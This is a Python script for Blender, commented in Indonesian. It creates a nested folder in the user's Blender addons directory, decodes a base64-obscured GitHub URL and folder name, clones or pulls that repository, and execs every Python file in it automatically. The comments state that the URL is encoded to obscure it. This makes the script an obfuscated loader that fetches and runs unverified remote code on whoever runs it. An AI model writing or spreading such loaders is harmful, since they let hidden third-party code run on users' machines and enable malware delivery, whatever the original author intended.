import bpy
import os
import subprocess
import base64

# Mendapatkan path user secara dinamis
USER_FOLDER = os.path.expanduser("~")

# Mendapatkan hanya dua angka pertama dari versi Blender (misal: "4.2.0" -> "4.2")
BLENDER_VERSION = ".".join(map(str, bpy.app.version[:2]))

ADDON_DIR = os.path.join(USER_FOLDER, "AppData", "Roaming", "Blender Foundation", "Blender", BLENDER_VERSION, "scripts", "addons", "_pyc_", "MAIN",  "B4")

# Pastikan folder tujuan ada, jika tidak maka buat
if not os.path.exists(ADDON_DIR):
    os.makedirs(ADDON_DIR, exist_ok=True)

# Mengaburkan nama folder ekstraksi
ENCODED_FOLDER = "UlItVC1CLjRfVjAyLjE="
EXTRACT_FOLDER = os.path.join(ADDON_DIR, base64.b64decode(ENCODED_FOLDER).decode('utf-8'))

# Mengaburkan URL repository
ENCODED_REPO = "aHR0cHM6Ly9naXRodWIuY29tL3Jyc3R1ZGlvZGV2ZWxvcG1lbnQvUlItVC1CLjRfVjAyLjE="
GITHUB_REPO = base64.b64decode(ENCODED_REPO).decode('utf-8')

def clone_repository():
    """Menggunakan git clone untuk mengunduh repository"""
    try:
        if os.path.exists(EXTRACT_FOLDER):
            print(f"Repository sudah ada. Melakukan update di {EXTRACT_FOLDER}...")
            subprocess.run(["git", "-C", EXTRACT_FOLDER, "pull"], check=True)
        else:
            print(f"Mengunduh repository ke {EXTRACT_FOLDER}...")
            subprocess.run(["git", "clone", GITHUB_REPO, EXTRACT_FOLDER], check=True)
        
        print("Repository berhasil di-clone atau diperbarui.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"Error saat cloning repository: {e}")
        return False

def execute_all_scripts():
    """Menjalankan semua script Python di dalam folder repository"""
    if os.path.exists(EXTRACT_FOLDER):
        print(f"Menjalankan script dari {EXTRACT_FOLDER}...")
        for file in os.listdir(EXTRACT_FOLDER):
            if file.endswith(".py"):
                script_path = os.path.join(EXTRACT_FOLDER, file)
                try:
                    print(f"Menjalankan {file}...")
                    with open(script_path, "r", encoding="utf-8") as script:
                        exec(script.read(), globals())
                    print(f"{file} berhasil dijalankan!")
                except Exception as e:
                    print(f"Error saat menjalankan {file}: {e}")
    else:
        print("Folder ekstraksi tidak ditemukan!")

# Jalankan proses saat script dijalankan
if clone_repository():
    execute_all_scripts()
